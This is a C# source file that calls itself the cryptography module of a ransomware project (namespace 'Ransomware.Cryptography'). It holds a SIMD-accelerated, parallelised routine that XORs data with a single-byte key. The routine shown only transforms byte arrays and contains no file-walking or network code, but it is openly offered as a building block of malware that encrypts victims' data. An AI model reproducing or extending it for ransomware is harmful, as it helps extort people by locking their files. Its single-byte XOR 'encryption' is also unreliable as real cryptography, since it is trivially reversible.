using System;
using System.Numerics;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;

namespace Ransomware.Cryptography;

/// <summary>
/// Provides high-performance XOR-based encryption and decryption using SIMD and parallelism.
/// </summary>
internal static class XOR
{
    /// <summary>
    /// Encrypts data using XOR with hardware acceleration.
    /// </summary>
    /// <param name="data">The input data to encrypt.</param>
    /// <param name="key">The XOR key.</param>
    /// <returns>The encrypted data.</returns>
    internal static byte[] Encrypt(byte[] data, byte key) => ProcessXOR(data, key);

    /// <summary>
    /// Decrypts data using XOR (same as encryption).
    /// </summary>
    /// <param name="data">The encrypted data to decrypt.</param>
    /// <param name="key">The XOR key.</param>
    /// <returns>The decrypted data.</returns>
    internal static byte[] Decrypt(byte[] data, byte key) => ProcessXOR(data, key);

    /// <summary>
    /// Processes XOR encryption/decryption using SIMD and parallelization.
    /// </summary>
    /// <param name="data">The input data.</param>
    /// <param name="key">The XOR key.</param>
    /// <returns>The processed data.</returns>
    private static byte[] ProcessXOR(byte[] data, byte key)
    {
        byte[] result = new byte[data.Length];
        int vectorSize = Vector<byte>.Count; // Usually 16 or 32 bytes (depends on CPU)

        if (data.Length >= vectorSize)
        {
            Vector<byte> keyVector = new Vector<byte>(key);
            int alignedLength = data.Length - (data.Length % vectorSize);

            Span<byte> sourceSpan = data;
            Span<byte> destinationSpan = result;

            Vector<byte>[] srcVectors = new Vector<byte>[alignedLength / vectorSize];
            Vector<byte>[] dstVectors = new Vector<byte>[alignedLength / vectorSize];

            for (int i = 0; i < srcVectors.Length; i++)
            {
                srcVectors[i] = Unsafe.ReadUnaligned<Vector<byte>>(ref sourceSpan[i * vectorSize]);
            }

            Parallel.For(0, srcVectors.Length, i =>
            {
                dstVectors[i] = srcVectors[i] ^ keyVector;
            });

            for (int i = 0; i < dstVectors.Length; i++)
            {
                Unsafe.WriteUnaligned(ref destinationSpan[i * vectorSize], dstVectors[i]);
            }

            // Process remaining bytes (if any)
            for (int i = alignedLength; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ key);
            }
        }
        else
        {
            // Fallback for small data (non-SIMD)
            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ key);
            }
        }

        return result;
    }
}